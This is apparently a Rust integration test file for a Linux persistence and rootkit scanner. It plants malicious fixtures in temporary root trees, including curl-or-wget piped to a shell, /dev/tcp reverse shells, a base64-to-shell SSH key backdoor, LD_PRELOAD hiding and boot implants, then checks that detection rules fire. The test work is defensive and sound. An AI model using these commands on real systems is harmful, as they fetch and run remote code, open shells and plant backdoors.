//! System checks against synthetic root trees. Nothing here reads the real
//! system's configuration or runs a package manager.
#![cfg(target_os = "linux")]
// Integration tests are separate crates, not covered by clippy.toml's
// `allow-unwrap-in-tests`; failing loudly is the desired behaviour here.
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::collections::BTreeSet;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::path::Path;

use warden_core::{
    CancellationToken, CheckStatus, FindingTarget, ObservedPath, PersistenceMechanism,
};
use warden_system::{SystemCheckOptions, SystemCheckOutcome, correlate, host_path, run_checks};

fn put(root: &Path, rel: &str, content: &str, mode: u32) {
    let p = root.join(rel.trim_start_matches('/'));
    std::fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    std::fs::write(&p, content).expect("write");
    std::fs::set_permissions(&p, std::fs::Permissions::from_mode(mode)).expect("chmod");
}

fn run(root: &Path) -> SystemCheckOutcome {
    let opts = SystemCheckOptions {
        root: root.to_owned(),
        hidden_processes: false,
        packages: false,
        ..SystemCheckOptions::default()
    };
    run_checks(&opts, &CancellationToken::new()).expect("run")
}

fn rule_ids(out: &SystemCheckOutcome) -> BTreeSet<String> {
    out.findings
        .iter()
        .filter_map(|f| f.source.rule_id.clone())
        .collect()
}

/// Rules that fire only because test files are owned by the (non-root)
/// test user rather than root.
const OWNERSHIP_RULES: &[&str] = &["AW-SYS-007", "AW-SYS-008"];

fn base_tree(root: &Path) {
    put(
        root,
        "/etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n\
         daemon:x:2:2::/sbin:/sbin/nologin\n",
        0o644,
    );
    put(root, "/usr/bin/good", "#!/bin/sh\n", 0o755);
    put(
        root,
        "/etc/systemd/system/good.service",
        "[Service]\nExecStart=/usr/bin/good --serve\n",
        0o644,
    );
    put(
        root,
        "/etc/crontab",
        "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n",
        0o644,
    );
    put(
        root,
        "/etc/cron.daily/logrotate",
        "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n",
        0o755,
    );
    put(
        root,
        "/etc/pam.d/login",
        "auth [success=1 default=ignore] pam_unix.so nullok\n@include common-session\n",
        0o644,
    );
    put(
        root,
        "/home/alice/.bashrc",
        "export PATH=$HOME/.local/bin:$PATH\nalias ll='ls -l'\n",
        0o644,
    );
    put(
        root,
        "/etc/udev/rules.d/60-x.rules",
        "SUBSYSTEM==\"block\", RUN+=\"/usr/bin/good\", RUN{builtin}+=\"blkid\"\n",
        0o644,
    );
    put(root, "/etc/hostname", "image-host\n", 0o644);
}

#[test]
fn benign_tree_has_no_heuristic_findings() {
    let dir = tempfile::tempdir().expect("tempdir");
    base_tree(dir.path());
    let out = run(dir.path());
    let ids: Vec<_> = rule_ids(&out)
        .into_iter()
        .filter(|id| !OWNERSHIP_RULES.contains(&id.as_str()))
        .collect();
    assert!(
        ids.is_empty(),
        "unexpected findings: {ids:?}\n{:#?}",
        out.findings
    );
    assert!(!out.host.live);
    assert_eq!(out.host.hostname.as_deref(), Some("image-host"));

    let mechs: BTreeSet<_> = out.persistence.iter().map(|e| e.mechanism).collect();
    for m in [
        PersistenceMechanism::SystemdService,
        PersistenceMechanism::Cron,
        PersistenceMechanism::ShellProfile,
        PersistenceMechanism::Udev,
    ] {
        assert!(mechs.contains(&m), "{m:?} missing from inventory");
    }
    let good = out
        .persistence
        .iter()
        .find(|e| e.mechanism == PersistenceMechanism::SystemdService)
        .expect("service");
    assert_eq!(
        good.executable.as_ref().map(|p| p.text.as_str()),
        Some("/usr/bin/good")
    );
    assert_eq!(good.enabled, Some(false));

    // Offline root: kernel and process checks are skipped, not faked.
    for c in &out.checks {
        if c.id.starts_with("kernel.")
            || c.id.starts_with("processes.")
            || c.id == "packages.verify"
        {
            assert_eq!(c.status, CheckStatus::Skipped, "{}", c.id);
        } else {
            assert_eq!(c.status, CheckStatus::Completed, "{}: {:?}", c.id, c.detail);
        }
    }
}

#[test]
fn planted_persistence_is_found() {
    let dir = tempfile::tempdir().expect("tempdir");
    let r = dir.path();
    base_tree(r);
    put(
        r,
        "/etc/systemd/system/evil.service",
        "[Service]\nExecStart=/tmp/.x/miner --pool x\n",
        0o644,
    );
    std::fs::create_dir_all(r.join("etc/systemd/system/multi-user.target.wants")).expect("mkdir");
    symlink(
        "/etc/systemd/system/evil.service",
        r.join("etc/systemd/system/multi-user.target.wants/evil.service"),
    )
    .expect("symlink");
    put(
        r,
        "/etc/cron.d/update",
        "@reboot root curl -s http://x.example/a | bash\n",
        0o644,
    );
    put(r, "/etc/ld.so.preload", "/usr/lib/libhide.so\n", 0o644);
    put(
        r,
        "/home/alice/.bashrc",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
        0o644,
    );
    put(
        r,
        "/home/alice/.config/autostart/x.desktop",
        "[Desktop Entry]\nName=x\nExec=/home/alice/.cache/.hid/run\n",
        0o644,
    );
    put(
        r,
        "/root/.ssh/authorized_keys",
        "command=\"echo aGk= | base64 -d | sh\" ssh-ed25519 AAAA backdoor\n",
        0o600,
    );
    put(
        r,
        "/etc/pam.d/sshd",
        "auth optional /tmp/pam_x.so\nsession optional pam_exec.so /usr/bin/good\n",
        0o644,
    );
    put(
        r,
        "/etc/environment",
        "LD_PRELOAD=/usr/lib/libhide.so\n",
        0o644,
    );
    put(
        r,
        "/etc/rc.local",
        "#!/bin/sh\nwget -qO- http://x/b | sh\nexit 0\n",
        0o755,
    );
    put(
        r,
        "/etc/udev/rules.d/99-x.rules",
        "ACTION==\"add\", RUN+=\"/dev/shm/u\"\n",
        0o644,
    );
    put(r, "/etc/profile.d/x.sh", "echo hi\n", 0o666);

    let out = run(r);
    let ids = rule_ids(&out);
    for want in [
        "AW-SYS-001", // /tmp, /dev/shm
        "AW-SYS-002", // curl | bash, wget | sh
        "AW-SYS-003", // /dev/tcp
        "AW-SYS-004", // base64 -d | sh
        "AW-SYS-005", // LD_PRELOAD=
        "AW-SYS-006", // /etc/ld.so.preload
        "AW-SYS-008", // world-writable profile.d file
        "AW-SYS-009", // hidden autostart program
        "AW-SYS-010", // PAM module in /tmp
        "AW-SYS-017", // pam_exec
    ] {
        assert!(ids.contains(want), "{want} not reported; got {ids:?}");
    }
    let evil = out
        .persistence
        .iter()
        .find(|e| e.location.text.ends_with("evil.service"))
        .expect("evil.service in inventory");
    assert_eq!(evil.enabled, Some(true));

    // Findings point at the defining file with the offending entry.
    let tcp = out
        .findings
        .iter()
        .find(|f| f.source.rule_id.as_deref() == Some("AW-SYS-003"))
        .expect("reverse shell");
    match &tcp.target {
        FindingTarget::Persistence {
            mechanism,
            location,
            entry,
        } => {
            assert_eq!(*mechanism, PersistenceMechanism::ShellProfile);
            assert_eq!(location.text, "/home/alice/.bashrc");
            assert!(entry.as_deref().is_some_and(|e| e.contains("/dev/tcp")));
        }
        other => panic!("unexpected target {other:?}"),
    }
    // Heuristic findings never claim confirmed confidence.
    assert!(
        out.findings
            .iter()
            .all(|f| f.confidence != warden_core::Confidence::Confirmed)
    );
}

#[test]
fn links_in_the_image_do_not_reach_the_host() {
    let dir = tempfile::tempdir().expect("tempdir");
    let host = tempfile::tempdir().expect("tempdir");
    put(
        host.path(),
        "/crontab",
        "* * * * * root curl http://x | sh\n",
        0o644,
    );
    let r = dir.path();
    base_tree(r);
    std::fs::create_dir_all(r.join("etc/cron.d")).expect("mkdir");
    symlink(host.path().join("crontab"), r.join("etc/cron.d/escape")).expect("symlink");

    let out = run(r);
    assert!(
        !rule_ids(&out).contains("AW-SYS-002"),
        "{:#?}",
        out.findings
    );
    assert!(
        host_path(r, &host.path().join("crontab")).is_err(),
        "host path resolved outside the root"
    );
    let inside = host_path(r, Path::new("/usr/bin/good")).expect("host path");
    assert!(inside.starts_with(r.canonicalize().expect("canon")));
}

#[test]
fn correlation_links_entries_to_detections() {
    let dir = tempfile::tempdir().expect("tempdir");
    let r = dir.path();
    base_tree(r);
    let out = run(r);
    let content = warden_core::Finding {
        id: warden_core::FindingId::new_random(),
        kind: warden_core::FindingKind::KnownIndicator,
        name: "Test.Indicator".into(),
        severity: warden_core::Severity::High,
        confidence: warden_core::Confidence::Confirmed,
        category: warden_core::ThreatCategory::TestIndicator,
        target: FindingTarget::File {
            path: ObservedPath::from_path(&r.join("usr/bin/good")),
            sha256: None,
            metadata: None,
        },
        source: warden_core::DetectionSource {
            detector: "hash-signatures".into(),
            detector_version: "0".into(),
            rule_id: None,
            rule_version: None,
            database_name: None,
            database_version: None,
        },
        evidence: Vec::new(),
        explanation: String::new(),
        recommended_action: warden_core::RecommendedAction::Review,
        remediation_guidance: None,
        remediation_status: warden_core::RemediationStatus::NotAttempted,
        remediation_detail: None,
        detected_at: time::OffsetDateTime::now_utc(),
    };
    let detected = [(
        ObservedPath::from_path(Path::new("/usr/bin/good")),
        &content,
    )];
    let linked = correlate(&out.persistence, &detected);
    assert!(!linked.is_empty());
    assert!(
        linked
            .iter()
            .all(|f| f.source.rule_id.as_deref() == Some("AW-SYS-016"))
    );
}

#[test]
fn additional_locations_are_inventoried_and_checked() {
    let dir = tempfile::tempdir().expect("tempdir");
    let r = dir.path();
    base_tree(r);
    put(
        r,
        "/etc/init.d/svc",
        "#!/bin/sh\ncurl -s http://x.example/p | sh\n",
        0o755,
    );
    std::fs::create_dir_all(r.join("etc/rc3.d")).expect("mkdir");
    symlink("../init.d/svc", r.join("etc/rc3.d/S20svc")).expect("symlink");
    put(
        r,
        "/var/spool/at/a00001",
        "#!/bin/sh\nexport SECRET=hunter2\n/tmp/.x/job\n",
        0o700,
    );
    put(
        r,
        "/usr/lib/systemd/system-generators/gen",
        "\u{7f}ELF binary with /dev/tcp/1.2.3.4/1 inside",
        0o755,
    );
    put(
        r,
        "/etc/modules-load.d/x.conf",
        "# comment\nrootkitmod\n",
        0o644,
    );
    put(
        r,
        "/etc/modprobe.d/x.conf",
        "install usb-storage /bin/true\ninstall e1000 /dev/shm/load; /sbin/modprobe --ignore-install e1000\n",
        0o644,
    );
    put(
        r,
        "/etc/update-motd.d/99-x",
        "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/1 0>&1\n",
        0o755,
    );
    put(r, "/root/.ssh/rc", "echo aGk= | base64 -d | sh\n", 0o644);
    put(
        r,
        "/etc/grub.d/40_custom",
        "#!/bin/sh\nwget -qO- http://x/g | sh\n",
        0o755,
    );
    put(
        r,
        "/etc/initramfs-tools/hooks/h",
        "#!/bin/sh\ncp /tmp/implant \"$DESTDIR\"\n/tmp/implant\n",
        0o755,
    );
    put(
        r,
        "/etc/default/grub",
        "GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX=\"quiet selinux=0 init=/bin/bash\"\n",
        0o644,
    );

    let out = run(r);
    let mechs: BTreeSet<_> = out.persistence.iter().map(|e| e.mechanism).collect();
    for m in [
        PersistenceMechanism::SysvInit,
        PersistenceMechanism::AtJob,
        PersistenceMechanism::SystemdGenerator,
        PersistenceMechanism::KernelModule,
        PersistenceMechanism::Motd,
        PersistenceMechanism::SshRc,
        PersistenceMechanism::BootLoader,
        PersistenceMechanism::InitramfsHook,
    ] {
        assert!(mechs.contains(&m), "{m:?} missing");
    }
    let svc = out
        .persistence
        .iter()
        .find(|e| e.mechanism == PersistenceMechanism::SysvInit)
        .expect("sysv");
    assert_eq!(svc.enabled, Some(true));

    let by_location = |rule: &str, loc: &str| {
        out.findings.iter().any(|f| {
            f.source.rule_id.as_deref() == Some(rule)
                && f.target.path().is_some_and(|p| p.text == loc)
        })
    };
    assert!(by_location("AW-SYS-002", "/etc/init.d/svc"));
    assert!(by_location("AW-SYS-001", "/var/spool/at/a00001"));
    assert!(by_location("AW-SYS-001", "/etc/modprobe.d/x.conf"));
    assert!(by_location("AW-SYS-003", "/etc/update-motd.d/99-x"));
    assert!(by_location("AW-SYS-004", "/root/.ssh/rc"));
    assert!(by_location("AW-SYS-002", "/etc/grub.d/40_custom"));
    assert!(by_location("AW-SYS-001", "/etc/initramfs-tools/hooks/h"));
    assert!(by_location("AW-SYS-028", "/etc/default/grub"));
    // Strings inside an ELF generator are not commands.
    assert!(!by_location(
        "AW-SYS-003",
        "/usr/lib/systemd/system-generators/gen"
    ));
    // The at job's environment is searched, never copied.
    let json = serde_json::to_string(&out.findings).expect("json")
        + &serde_json::to_string(&out.persistence).expect("json");
    assert!(!json.contains("hunter2"));
}

#[test]
fn dpkg_database_is_verified_without_dpkg() {
    let dir = tempfile::tempdir().expect("tempdir");
    let r = dir.path();
    base_tree(r);
    put(r, "/usr/bin/ls", "original ls\n", 0o755);
    put(r, "/usr/bin/ps", "TROJANED ps\n", 0o755);
    put(r, "/var/lib/dpkg/status", "Package: coreutils\n", 0o644);
    // usrmerge: the package lists /bin/ls, the file lives at /usr/bin/ls.
    put(
        r,
        "/var/lib/dpkg/info/coreutils.list",
        "/bin\n/bin/ls\n",
        0o644,
    );
    put(
        r,
        "/var/lib/dpkg/info/procps:amd64.list",
        "/usr/bin/ps\n",
        0o644,
    );
    let md5 = |s: &str| {
        use md5::{Digest, Md5};
        Md5::digest(s.as_bytes())
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect::<String>()
    };
    put(
        r,
        "/var/lib/dpkg/info/coreutils.md5sums",
        &format!("{}  bin/ls\n", md5("original ls\n")),
        0o644,
    );
    put(
        r,
        "/var/lib/dpkg/info/procps:amd64.md5sums",
        &format!("{}  usr/bin/ps\n", md5("original ps\n")),
        0o644,
    );

    let opts = SystemCheckOptions {
        root: r.to_owned(),
        hidden_processes: false,
        packages: true,
        ..SystemCheckOptions::default()
    };
    let out = run_checks(&opts, &CancellationToken::new()).expect("run");
    let modified: Vec<&str> = out
        .findings
        .iter()
        .filter(|f| f.source.rule_id.as_deref() == Some("AW-SYS-015"))
        .filter_map(|f| f.target.path().map(|p| p.text.as_str()))
        .collect();
    assert_eq!(modified, ["/usr/bin/ps"]);
    let check = out
        .checks
        .iter()
        .find(|c| c.id == "packages.verify")
        .expect("check");
    assert_eq!(check.status, CheckStatus::Completed, "{:?}", check.detail);
    assert_eq!(check.examined, 2);
}

#[test]
fn writable_boot_files_are_reported() {
    let dir = tempfile::tempdir().expect("tempdir");
    let r = dir.path();
    base_tree(r);
    put(r, "/boot/vmlinuz-1", "kernel", 0o666);
    let out = run(r);
    assert!(out.findings.iter().any(|f| {
        f.source.rule_id.as_deref() == Some("AW-SYS-029")
            && f.target.path().is_some_and(|p| p.text == "/boot/vmlinuz-1")
    }));
}
